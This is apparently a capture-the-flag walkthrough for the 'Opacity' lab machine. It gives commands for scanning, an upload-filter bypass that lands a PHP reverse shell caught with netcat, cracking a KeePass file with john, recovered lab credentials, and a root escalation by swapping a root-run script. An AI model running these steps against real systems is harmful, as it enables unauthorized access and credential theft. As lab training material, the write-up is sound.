<h2>Target: 10.10.194.154  Opacity </h2>

<b>Initial Access:</b><br>
Step 1: nmap -Pn 10.10.194.154 -p- --min-rate=5000|grep open|awk -F '/' '{print $1}'|tr '\n' ',' <br>
Nmap returns open ports: 22,80,139,445

Step 2: Enumerate the open ports further using nmap: nmap -Pn 10.10.194.154 --min-rate=5000 -p 22,80,139,445 -sC -sV -oN nmap-opacity

Step 3: Run directory brute force on port 80: dirsearch -r -u http://10.6.64.178 -e php -f -o dsearch-opacity

Dirsearch found a directory of /cloud.  

Step 4: Navigating to http://10.6.64.178/cloud shows the page has an upload image function.  Since the upload function takes a url for uploading, create a file on our local pc called “php-rev-shell.php” and host the file using a python web server: python3 -m http.server 80

The upload image function has a filter in place that checks that the filename ends in .jpg, .jpeg, or .png.  To bypass the filter, enter a url of http://php-rev-shell.php#.jpg

Step 5: Open a netcat listener to catch the reverse shell: nc -lvnp 443

Step 6: Enter the url http://ourip/php-rev-shell.php#jpg and click on ‘upload image’. 

The image uploads and runs the reverse shell.  We get a shell on our netcat listener as user www-data.

____________________________________________
<b>Lateral Movement:</b><br>
Step 1: Navigating to the directory /opt shows a keepass file called dataset.kdbx.  Download the file /opt/dataset.kdbx

Step 2: Crack the hash on dataset.kdbx.  First use john to convert the file to a hash john can use: keepass2john dataset.kdbx > john.txt

Next, run john to crack the hash: john hash –wordlist=/usr/share/wordlists/rockyou.txt

John cracked the hash to “741852963”

Step 3: Open the keepass file using the command: keepassxc dataset.kdbx

This opens a kepassxc gui. Enter the password we got from john: 741852963

After entering the password the keepassxc gui shows credentials: username ‘sysadmin’ and password ‘Cl0udP4ss40p4city#8700’

Step 4: Check the usernames on the target shell in the file /etc/passwd: cat /etc/passwd |grep sh

This shows the target shell has a username of ‘sysadmin’.  The same username we found in the keepass file.  

Step 5: On the target shell, change to user sysadmin: su sysadmin → enter the password when prompted

We have shell as user sysadmin.  We can get the flag in /home/sysadmin/local.txt
_____________________________________________
<b>Privilege Escalation</b><br>
Step 1: Check for background processes that are running.  In order to do this we will use pspy.  Upload pspy to the target shell and run pspy.  

Pspy shows a process running a file called /home/sysadmin/scripts/script.php as the root user.  

Step 2: File permissions on script.php prevent editing or deleting it.  

Check the file permissions in the directory above script.php → /home/syadmin/scripts.

Again, file permissions prevent editing or deleting the directory ‘scripts’.  However, because the directory ‘scripts’ is in the directory ‘/home/sysadmin’ which is under sysadmin user permissions, we can change the name of the directory ‘scripts’: mv scripts oldscripts
 
Step 3: Create a new directory called ‘scripts’: mkdir scripts

Step 4: Upload a php reverse shell called ‘script.php’ to the target shell in the directory /home/sysadmin/scripts

Step 5: Open a netcat listener to catch the reverse shell: rlwrap nc -lnvp 443

Wait a few moments for the task to run.  Once the task runs we get a shell as root on our netcat listener.  We can get the flag in /root/proof.txt
